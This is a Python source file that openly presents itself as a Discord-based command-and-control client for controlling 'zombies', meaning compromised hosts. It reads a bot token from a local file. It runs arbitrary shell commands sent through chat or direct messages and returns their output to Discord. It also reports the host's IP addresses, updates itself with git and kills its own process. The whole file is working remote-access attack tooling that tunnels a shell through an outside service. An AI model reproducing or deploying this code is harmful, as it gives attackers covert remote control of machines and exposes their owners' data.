'''
Application: chat.py
Author: Andrew Eng
Date: 2020-11-10

Description:
This is a c2 client that communicates via discord.  Enter in your bot token and authorized user id to command and control your zombies.

Usage: python3 chat.py

You can talk directly to the bot or through public chat.  If you are talking on the public chat; the command execution codes are:
@bot_name cmd <command to execute>
If you DM the bot directly, you can say "ip" to get IP address information
CTRL + C to exit the discord connection
Command executions to the bot is logged in chat.log

'''

import discord
import netifaces
from subprocess import Popen, PIPE
import datetime as dt
import random
import time

# Make sure you create a credentials.txt file in your home directory
keys = []
with open('credentials.txt','r') as credentials:
    for eachline in credentials:
        reading = eachline.split(' = ')
        keys.append(reading[1])
credentials.close()

token = keys[0].strip()
authorized_id = keys[1].strip()
authorized_user = keys[2].strip()

# Greetings list
greetings = ['Hello!','Hey there!','What is going on?','WazzzzAAAAAP!','How do you do?','How have you been?','Hey','Long-time no see','Yo!','Wuddup!','Sup','Heyyy...','Whats Crackin?','Howdy!',]

# Get IP address info
def getIP():
    count = 0
    interfaces = netifaces.interfaces()
    listIP = []
    while count < len(interfaces):
        try:
            listIP.append(f'{interfaces[count]}: {netifaces.ifaddresses(interfaces[count])[netifaces.AF_INET]}')
            count +=1
        except:
            count +=1
    return listIP

#################################################

client = discord.Client()

@client.event
async def on_ready():
    print('Logged into C2 Server')
    print('CTRL + C to exit\n')

@client.event
async def on_member_join(member):
    await message.channel.send(f'{random.choice(greetings)} {member.name}, do you have the right place?')

@client.event
async def on_message(message):
    
    with open('/tmp/c2-chat.log','a') as chatlog:
        chatlog.write(f'{dt.datetime.now()}, {message.author.name}, {message.content}\n')
    chatlog.close()

    print(f'{message.content}\n')

    if message.author.id == client.user.id:
        return

# Converts the msg content to all lowercase
    msg_content = message.content.lower()

# Greetings
    if msg_content.startswith('hi') or msg_content.startswith('hello'):
        with open('/tmp/c2-chat.log','a') as log:
            log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
        log.close()
        await message.channel.send(random.choice(greetings))

# Status Check
    if msg_content.startswith('status'):
        with open('/tmp/c2-chat.log','a') as log:
            log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
        log.close()

        await message.channel.send(f'Yes, I am here...')

# Update
    if msg_content.startswith('update'):
        with open('/tmp/c2-command.log','a') as log:
            log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
        log.close()

        await message.channel.send(f'Checking for updates...')

        # Kill existing c2 channels
        git_update = 'git fetch && git reset --hard HEAD && git pull'
        pidsub = Popen("ps aux | grep 'chat' | grep -v grep | awk -F '  ' '{print $2}'", shell=True, stdout=PIPE)
        output = pidsub.stdout.readlines()
        pid = output[0].decode('utf-8').strip('\n').strip()
        kill_process = 'kill -9 ' + pid

        await message.channel.send(f'--- Hey, I will be right back, I am going to do some updates...')
        stdout = Popen(git_update, shell=True, stdout=PIPE).stdout
        output = stdout.read().decode('utf-8').split('\n')
        for eachline in output:
            if bool(eachline) == True:
                await message.channel.send(eachline)

        Popen(kill_process, shell=True)
        print(f'{dt.datetime.now()}, Update Complete')

# Restart chat.py # REMINDER!! Wrap this into a function and just call it.
    if msg_content.startswith('stop') or msg_content.startswith('restart'):
        with open('/tmp/c2-command.log','a') as log:
            log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
        log.close()

        pidsub = Popen("ps aux | grep 'chat' | grep -v grep | awk -F '  ' '{print $2}'", shell=True, stdout=PIPE)
        output = pidsub.stdout.readlines()
        pid = output[0].decode('utf-8').strip('\n').strip()
        kill_process = 'kill -9 ' + pid
        await message.channel.send('I am killing my chat processes.... brb..')
        Popen(kill_process, shell=True)

# Quick IP Check
    if msg_content.startswith('ip'):
        with open('/tmp/c2-command.log','a') as log:
            log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
        log.close()

        myIP = getIP()
        count = 0
        while count < len(myIP):
            await message.channel.send(myIP[count])
            count +=1
        await message.channel.send('.... waiting for next commands')

# Monitor the chatroom for keyword "cmd" and execute commands
    if msg_content.startswith('cmd'):
        if message.author.name == authorized_user:
            msg = msg_content.split(' ')

            with open('/tmp/c2-command.log','a') as log:
                log.write(f'{dt.datetime.now()}, {message.author.name}, {msg_content}\n')
            log.close()

            cmd = ' '.join(msg[1:len(msg)])
            stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
            output = stdout.read().decode('utf-8').split('\n')
            for eachline in output:
                if bool(eachline) == True:
                    await message.channel.send(eachline)

# Execute system commands by DM
    if msg_content.startswith(authorized_id):
        # split the messages and create a list
        msg = msg_content.split(' ')

        # Create chat log
        with open('/tmp/c2-command_dm.log','a') as log:
            log.write(f'{dt.datetime.now()}, {msg_content}\n')
        log.close()
        
        cmd = ' '.join(msg[2:len(msg)])

        stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
        output = stdout.read().decode('utf-8').split('\n')
        for eachline in output:
            if bool(eachline) == True:
                await message.channel.send(eachline)

client.run(token)
